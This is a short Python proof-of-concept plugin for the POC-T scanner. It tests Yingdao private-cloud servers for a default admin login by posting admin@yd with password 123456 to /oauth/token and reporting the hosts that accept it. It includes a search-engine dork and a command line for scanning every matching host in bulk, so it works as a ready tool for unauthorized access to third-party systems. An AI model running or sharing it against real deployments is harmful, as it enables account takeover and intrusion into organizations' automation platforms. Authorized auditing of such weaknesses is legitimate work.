#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   yingdao_priv_cloud_weakpass
@DateTime :  2023/11/26 19:40 


@Dork
    title=="影刀专有云"

@Cmdline
    python POC-T.py -s yingdao_priv_cloud_weakpass.py -aF title=="影刀专有云"

@Request
```
POST /oauth/token


username=admin%40yd&password=123456&grant_type=password&scope=all
```

@Expected Response
    r_Text -> "success": "false",
'''

from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log
import json


def poc(url):
    url = urljoin_ex(url, "/oauth/token")
    resp = request_ex("post", url, data="username=admin%40yd&password=123456&grant_type=password&scope=all")
    if resp and "oauth2" in resp.text:
        print(url)
        rj = json.loads(resp.text)
        if "success" in rj and (rj["success"] == "true" or rj["success"] is True):
            # print(rj)
            return True
    else:
        return False
